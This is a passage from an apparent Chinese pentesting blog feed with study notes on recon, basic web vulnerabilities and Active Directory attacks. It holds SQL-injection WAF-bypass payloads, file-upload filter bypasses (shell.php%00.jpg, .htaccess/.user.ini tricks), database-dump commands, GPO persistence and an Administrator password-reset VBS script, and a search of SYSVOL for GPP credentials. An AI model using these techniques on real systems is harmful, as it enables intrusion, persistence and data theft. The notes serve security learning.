href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><h3 id="google-hack语法"><a href="#google-hack语法" class="headerlink" title="google hack语法"></a>google hack语法</h3><p>site:xxx.com intext:管理</p><p>site:xxx.com inurl:login/admin</p><p>site:xxx.com intitle:后台</p><p>site:xxx.com filetype:文件的格式 </p><h3 id="jsfinder"><a href="#jsfinder" class="headerlink" title="jsfinder"></a>jsfinder</h3><p>JSFinder</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install requests bs4</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Threezh1&#x2F;JSFinder.git  快速提取js中的子域名</span><br></pre></td></tr></table></figure><p>魔改：<br><a href="https://github.com/msfisgood/JSFinderAAA">msfisgood/JSFinderAAA: JSFinder魔改版 (github.com)</a></p><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul><li>dirsearch</li><li>dirmap</li></ul><h1 id="漏洞库"><a href="#漏洞库" class="headerlink" title="漏洞库"></a>漏洞库</h1><p><a href="https://wiki.96.mk/">https://wiki.96.mk/</a></p><p><a href="https://wiki.bylibrary.cn/">https://wiki.bylibrary.cn/</a></p><p><a href="https://qftm.github.io/Information_Collection_Handbook/exploit-database/domestic.html">国内 · Information Collection Handbook (qftm.github.io)</a></p><p><a href="https://qftm.github.io/Information_Collection_Handbook/exploit-database/foreign.html">国外 · Information Collection Handbook (qftm.github.io)</a></p><p>cve仓库等：</p><p><a href="http://vul.tidesec.com/">Tide潮听漏洞情报平台 (tidesec.com)</a></p><p><a href="https://avd.aliyun.com/">阿里云漏洞库 (aliyun.com)</a></p><p><a href="https://unsafe.sh/cve">unsafe.sh - 不安全</a></p><p>在线工具：</p><p><a href="https://hackertarget.com/">https://hackertarget.com/</a>  </p><p><a href="https://lovebear.top/info/cn/index.html">https://lovebear.top/info/cn/index.html</a></p><p><a href="https://lovebear.top/info/cn/index.html">https://lovebear.top/info/cn/index.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;参考&lt;/p&gt;
&lt;p&gt;本文参考：&lt;a href=&quot;https://github.com/Qftm/Information_Collection_Handbook&quot;&gt;https://github.com/Qftm/Information_Collection_Handbook&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;域名信息&quot;&gt;&lt;a href=&quot;#域名信息&quot; class=&quot;headerlink&quot; title=&quot;域名信息&quot;&gt;&lt;/a&gt;域名信息&lt;/h1&gt;&lt;p&gt;查询域名是否已经被注册，以及注册域名和注册人的详细信息&lt;/p&gt;
&lt;h3 id=&quot;whois查询&quot;&gt;&lt;a href=&quot;#whois查询&quot; class=&quot;headerlink&quot; title=&quot;whois查询&quot;&gt;&lt;/a&gt;whois查询&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;站长之家：&lt;a href=&quot;http://whois.chinaz.com/&quot;&gt;http://whois.chinaz.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;国外：       &lt;a href=&quot;https://www.whois.com/&quot;&gt;https://www.whois.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;腾讯云：  &lt;a href=&quot;https://whois.cloud.tencent.com/domain?domain=&quot;&gt;https://whois.cloud.tencent.com/domain?domain=&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>基础web漏洞总结</title>
    <link href="http://example.com/2022/03/14/%E5%9F%BA%E7%A1%80web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2022/03/14/%E5%9F%BA%E7%A1%80web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2022-03-14T08:38:25.000Z</published>
    <updated>2022-04-24T03:17:22.347Z</updated>
    
    <content type="html"><![CDATA[<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>同协议同域名同端口的网站才能进行资源的获取和共享。</p><h3 id="jsonp-劫持"><a href="#jsonp-劫持" class="headerlink" title="jsonp  劫持"></a>jsonp  劫持</h3><p><a href="http://wjlshare.com/archives/1319">JSONP劫持漏洞学习笔记(待补充) – 天下大木头 (wjlshare.com)</a></p><p>利用<code>&lt;script&gt;</code>标签</p><h3 id="core"><a href="#core" class="headerlink" title="core"></a>core</h3><p>利用Origin头</p><h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1><p>简单来说就是传参过滤不严谨照成sql语句的拼接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id  = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$sql = <span class="string">&quot;SELECT name FROM users WHERE id = <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure><p><a href="https://www.shmilying.tk/categories/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/">常见数据库注入 | (shmilying.tk)</a></p> <a id="more"></a><h3 id="常见基础绕过"><a href="#常见基础绕过" class="headerlink" title="常见基础绕过"></a>常见基础绕过</h3><p>绕过空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%20</span><br><span class="line">+</span><br><span class="line">&#x2F;**&#x2F;</span><br><span class="line">()</span><br><span class="line">&#x2F;*!%23xxxx%%0a*&#x2F;</span><br><span class="line">%23c%0a</span><br></pre></td></tr></table></figure><p>关键字绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">大小写&#x2F;双写</span><br><span class="line">&#x2F;*!select*&#x2F;</span><br><span class="line">&#x2F;*!50000select*&#x2F;            50000不行可以fuzz其他的数字试试，小于当前mysql版本号就行，能使用</span><br><span class="line">sel&#x2F;**&#x2F;ect</span><br><span class="line"></span><br><span class="line">%23 -&gt;#</span><br><span class="line">%0a -&gt;换行</span><br><span class="line"></span><br><span class="line">结合：</span><br><span class="line">select *from &#x2F;*!%23xxxxx%0a*&#x2F;users;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">绕安全狗（https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;eva6L_zQx79GTWCDvfT7zg）</span><br><span class="line">select</span><br><span class="line">&#x2F;*!50000%53elect*&#x2F;</span><br><span class="line">order </span><br><span class="line"> &#x2F;*!50000%6frder*&#x2F;</span><br><span class="line">union</span><br><span class="line">&#x2F;*!50000%75nion*&#x2F;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from</span><br><span class="line">&#x2F;*!%23xxxx%%0afrom*&#x2F;</span><br><span class="line"></span><br><span class="line">database()</span><br><span class="line"></span><br><span class="line">database&#x2F;*!%23xxxx%0a*&#x2F;()</span><br></pre></td></tr></table></figure><p>注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--+www</span><br><span class="line">-- www</span><br><span class="line">#</span><br></pre></td></tr></table></figure><h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><h3 id="bypass收藏语句"><a href="#bypass收藏语句" class="headerlink" title="bypass收藏语句"></a>bypass收藏语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><ol><li>判断前后端校验</li><li>判断黑白名单（可以上传1.xxxxx 测试）</li></ol><h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><h5 id="利用文件包含"><a href="#利用文件包含" class="headerlink" title="利用文件包含"></a>利用文件包含</h5><ul><li>图片马</li><li>包含session文件</li><li>条件竞争（大量上传正确文件，在这个空隙中上传恶意后缀文件 。  这个要看他后端代码 判断有问题）</li></ul><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><h5 id="后缀绕过"><a href="#后缀绕过" class="headerlink" title="后缀绕过"></a>后缀绕过</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">##### %00截断</span><br><span class="line"></span><br><span class="line">.xxx.com&#x2F;shell.php%00.jpg    ---&gt;   .xxx.com&#x2F;shell.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>get  %00<br>post  urldecode(%00) 即  00(hex)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### windows特性</span><br><span class="line"></span><br><span class="line"> test.asp. </span><br><span class="line"></span><br><span class="line">test.asp_</span><br><span class="line"></span><br><span class="line">test.asp+空格</span><br><span class="line"></span><br><span class="line">test.asp::$DATA</span><br><span class="line"></span><br><span class="line">### 解析漏洞</span><br><span class="line"></span><br><span class="line">- IIS 6.0—— （*.asp;.jpg             *.asp&#x2F;test.jpg   ）</span><br><span class="line">- IIS 7.x—— 默认Fast-cgi开启，直接在图片地址后面输入&#x2F;.php就会将图片当做php解析</span><br><span class="line">- Nginx——版本小于0.8.37 利用方法和IIS7.0一样</span><br><span class="line">- Apache—— 上传文件名为test.php.x1.x2.x3, Apache是从右往左判断</span><br><span class="line">- Lighttpd—— XX.jpg&#x2F;xx.php</span><br><span class="line"></span><br><span class="line">apache的 &#96;.htaccess&#96;解析</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>AddType application/ x-httpd-php .jpg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;.user.ini &#96; (nginx&#x2F;apache&#x2F;IIS中支持fastcgi的都可以用)  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>auto_prepend_file=test.jpg   # 在页面顶部加载文件    （类似于在文件前调用了require()函数包含test.jpg）       </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### bypass</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;10459</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;10515</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### disable_functions Bypass </span><br><span class="line"></span><br><span class="line">1. LD_PRELOAD </span><br><span class="line">2. 利用 Windows 系统组件 COM</span><br><span class="line">3. 蚁剑插件</span><br><span class="line"></span><br><span class="line">[bypass disable_function多种方法+实例 - 安全客，安全资讯平台 (anquanke.com)](https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;208451)</span><br><span class="line"></span><br><span class="line">[干货 | 突破disable_functions限制执行命令·上 - 云+社区 - 腾讯云 (tencent.com)](https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1944125)</span><br><span class="line"></span><br><span class="line">[干货 | 突破disable_functions限制执行命令·下 - 云+社区 - 腾讯云 (tencent.com)](https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1944129)</span><br><span class="line"></span><br><span class="line">### tips</span><br><span class="line"></span><br><span class="line">+ 条件竞争</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># csrf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">referer</span><br><span class="line"></span><br><span class="line">token</span><br><span class="line"></span><br><span class="line"># ssrf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 常用协议：</span><br><span class="line"></span><br><span class="line">file，dict，gopher，dns</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### ssrf+redis</span><br><span class="line"></span><br><span class="line">1. 主从复制</span><br><span class="line">2. 计划任务</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 网站源码备份</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>cd /var/www/html<br>tar -zcvf ~/html.tar.gz *</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 脱数据库</span><br><span class="line"></span><br><span class="line">+ mysql</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> mysqldump -u root -p –all-databases &gt; ~/backup.sql  # 备份所有数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>在mysql/data/  中文件1111</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ mssql 数据库</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>backup database Test to disk=’D:/Test.bak’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>msdbdata.mdf msdblog.ldf 两个文件 copy 一份</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ acccess数据库</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>mdb格式直接下载</p><pre><code></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;同源策略&quot;&gt;&lt;a href=&quot;#同源策略&quot; class=&quot;headerlink&quot; title=&quot;同源策略&quot;&gt;&lt;/a&gt;同源策略&lt;/h1&gt;&lt;p&gt;同协议同域名同端口的网站才能进行资源的获取和共享。&lt;/p&gt;
&lt;h3 id=&quot;jsonp-劫持&quot;&gt;&lt;a href=&quot;#jsonp-劫持&quot; class=&quot;headerlink&quot; title=&quot;jsonp  劫持&quot;&gt;&lt;/a&gt;jsonp  劫持&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://wjlshare.com/archives/1319&quot;&gt;JSONP劫持漏洞学习笔记(待补充) – 天下大木头 (wjlshare.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;利用&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;标签&lt;/p&gt;
&lt;h3 id=&quot;core&quot;&gt;&lt;a href=&quot;#core&quot; class=&quot;headerlink&quot; title=&quot;core&quot;&gt;&lt;/a&gt;core&lt;/h3&gt;&lt;p&gt;利用Origin头&lt;/p&gt;
&lt;h1 id=&quot;sql&quot;&gt;&lt;a href=&quot;#sql&quot; class=&quot;headerlink&quot; title=&quot;sql&quot;&gt;&lt;/a&gt;sql&lt;/h1&gt;&lt;p&gt;简单来说就是传参过滤不严谨照成sql语句的拼接&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$id  = $_GET[&lt;span class=&quot;string&quot;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$sql = &lt;span class=&quot;string&quot;&gt;&amp;quot;SELECT name FROM users WHERE id = &lt;span class=&quot;subst&quot;&gt;$id&lt;/span&gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;&lt;a href=&quot;https://www.shmilying.tk/categories/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/&quot;&gt;常见数据库注入 | (shmilying.tk)&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="基础web漏洞" scheme="http://example.com/tags/%E5%9F%BA%E7%A1%80web%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>AD域的攻击方式</title>
    <link href="http://example.com/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
    <id>http://example.com/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</id>
    <published>2022-03-03T04:11:19.000Z</published>
    <updated>2022-05-25T09:37:13.571Z</updated>
    
    <content type="html"><![CDATA[<h1 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h1><h3 id="本地组策略-LGP"><a href="#本地组策略-LGP" class="headerlink" title="本地组策略 LGP"></a>本地组策略 LGP</h3><p>简称（Local Group Policy或者Local GPO）</p><p>win+R键打开运行，输入“gpedit.msc”</p><p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220303233218371.png" alt="image-20220303233218371"></p><p>添加对应脚本即可</p><p>或者将文件直接放入C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup   路径下  （可以开机自启）</p><p>通常用来<code>权限维持</code></p><a id="more"></a><h3 id="域组策略"><a href="#域组策略" class="headerlink" title="域组策略"></a>域组策略</h3><p><a href="https://adsecurity.org/?p=2288">在SYSVOL中查找密码并利用组策略首选项 - Active Directory Security (adsecurity.org)</a></p><p>域控机器下发一些策略，可以利用域组策略进行批量修改</p><p>了解下两个默认的共享文件夹SYSVOL和netlogon</p><p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220411234636929.png" alt="image-20220411234636929"></p><h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h5><ul><li>保存了域内组策略相关的信息（登陆脚本，组策略数据，等等），</li></ul><p>SYSVOL是存储域公共文件服务器副本的共享的文件夹，存在域控制器(DC)的C:\Windows\SYSVOL下，用来为整个域中域控制器提供访问，复制，共享的能力。  在域中，用户登录时会先在sysvol下查找<strong>GPO</strong></p><p>目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Domain 文件夹：存储策略实体，策略和脚本存储位置</span><br><span class="line">Staging：交换区域，临时存放多台DC之间需要同步的数据，DC中的数据首先复制该文件夹，然后在DC之间相互复制</span><br></pre></td></tr></table></figure><p>默认所有域用户都能访问DC 的SYSVOL文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\win2016dc\SYSVOL</span><br></pre></td></tr></table></figure><p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412000133235.png" alt="image-20220412000133235"></p><ul><li><p>存储凭据</p><p>当创建新的GPP时，在SYSVOL中创建了一个关联的XML文件，其中包含相关的配置数据，并且如果提供了密码，则它是AES-256位加密的</p></li></ul><p>除了在2012年之前的某个时候，<a href="https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx">微软在MSDN上发布了AES私钥</a>，可用于解密密码。由于经过身份验证的用户（任何域用户或受信任域中的用户）对 SYSVOL 具有读取访问权限，因此域中的任何人都可以在 SYSVOL 共享中搜索包含“cpassword”的 XML 文件，这是包含 AES 加密密码的值</p><p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">域渗透——利用SYSVOL还原组策略中保存的密码 (3gstudent.github.io)</a></p><h5 id="netlogon"><a href="#netlogon" class="headerlink" title="netlogon"></a>netlogon</h5><p><strong>netlogon</strong> 挂载点为 <code>SYSVOL\domain\SCRIPTS</code> ，存放脚本信息。</p><p>AD活动目录安装时候自动创建的例如sysvol\shmily.god\scripts</p><h3 id="GPO"><a href="#GPO" class="headerlink" title="GPO"></a>GPO</h3><p>（Group Policy Object）</p><p>组策略对象，即组策略设置的集合，用GPO来存储不同的组策略信息。</p><p>安装完AD之后系统<code>默认</code>会存在<code>两个组策略对象</code></p><ol><li>Default Domain Policy   唯一ID:{31B2F340-016D-11D2-945F-00C04FB984F9}        默认域策略</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\SYSVOL\sysvol\shmily.god\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412001529990.png" alt="image-20220412001529990"></p><ol start="2"><li>Default Domain Controllers Policy   唯一ID(GUID):｛6AC1786C-016F-11D2-945F- 00C04FB984F9｝  默认域控制器策略</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\SYSVOL\sysvol\shmily.god\Policies\&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412001626442.png" alt="image-20220412001626442"></p><p>根据上面截图有4个策略，执行的优先级顺序：</p><p>本地策略   站点策略       域策略   OU策略。</p><p>GPO作用的范围是DC这个OU</p><h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3><p>即  组策略首选项（Group Policy Preference，GPP）借助了GPO实现域中所有资源的管理</p><p>编辑gpo，可以看到gpp相关内容</p><p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412003126191.png" alt="image-20220412003126191"></p><p>Gpp 用来在下面场景存储和使用凭据，通过gpp批量下发策略等 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">映射驱动（Drives.xml）</span><br><span class="line">创建本地用户</span><br><span class="line">数据源（DataSources.xml）</span><br><span class="line">打印机配置（Printers.xml）</span><br><span class="line">创建&#x2F;更新服务（Services.xml）</span><br><span class="line">计划任务（ScheduledTasks.xml）</span><br><span class="line">更改本地Administrator密码</span><br></pre></td></tr></table></figure><h1 id="域组策略利用"><a href="#域组策略利用" class="headerlink" title="域组策略利用"></a>域组策略利用</h1><h3 id="下发策略"><a href="#下发策略" class="headerlink" title="下发策略"></a>下发策略</h3><p>将下面代码保存为chpass.vbs ,这个脚本作于是将本地管理员账户的密码修改为abcabc123…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">strComputer &#x3D; &quot;.&quot;</span><br><span class="line">Set objUser &#x3D; GetObject(&quot;WinNT:&#x2F;&#x2F;&quot; &amp; strComputer &amp; &quot;&#x2F;Administrator, user&quot;)</span><br><span class="line">objUser.SetPassword &quot;abcabc123...&quot;</span><br><span class="line">objUser.SetInfo</span><br></pre></td></tr></table></figure><p>下发策略脚本，将脚本放在对应文件中</p><p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412005407566.png" alt="image-20220412005407566"></p><p>域用户机器上进行强制更新组策略</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate &#x2F;force</span><br></pre></td></tr></table></figure><h3 id="读取策略"><a href="#读取策略" class="headerlink" title="读取策略"></a>读取策略</h3><p>域用户搜索对应文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\win2016dc\sysvol\shmily.god\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\Machine\Scripts\Startup\chpass.vbs</span><br></pre></td></tr></table></figure><p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412005607573.png" alt="image-20220412005607573"></p><h3 id="寻找策略"><a href="#寻找策略" class="headerlink" title="寻找策略"></a>寻找策略</h3><p>搜索SYSVOL的下的脚本命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;r \\dc\sysvol %i in (*.vbs) do @echo %i</span><br><span class="line">for &#x2F;r \\dc\sysvol %i in (*.bat) do @echo %i</span><br></pre></td></tr></table></figure><p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412005839544.png" alt="image-20220412005839544"></p><h1 id="GPP漏洞"><a href="#GPP漏洞" class="headerlink" title="GPP漏洞"></a>GPP漏洞</h1><h3 id="原理"><a href="#原理" class="headerlink" 